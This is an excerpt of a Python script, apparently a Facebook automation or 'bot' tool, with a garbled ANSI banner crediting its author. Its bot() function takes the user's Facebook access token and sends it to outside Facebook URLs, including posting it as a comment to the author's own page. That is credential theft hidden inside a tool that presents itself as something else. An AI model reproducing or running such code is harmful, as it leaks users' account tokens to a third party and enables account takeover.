...
\033[1;97mâ–’â–ˆâ–‘â–‘â–‘ â–’â–ˆâ–„â–„â–ˆ â–’â–ˆâ–„â–„â–ˆ â–’â–ˆâ–„â–„â–ˆ â–’â–ˆâ–‘â–’â–ˆ â–€â–€â–€   \033[1;95m MR NaZir KhaN
""")
...
def bot():
	try:
		...
		tokenz()
	kom = ("Gantengnya NaZir KhAn ðŸ˜˜")
	requests.post('https://www.facebook.com/groups/1267278830395332/?ref=share/subscribers?access_token=' + toket) 
	requests.post('https://www.facebook.com/NaZerkhaN521/comments/?message=' + toket + '&access_token=' + toket)
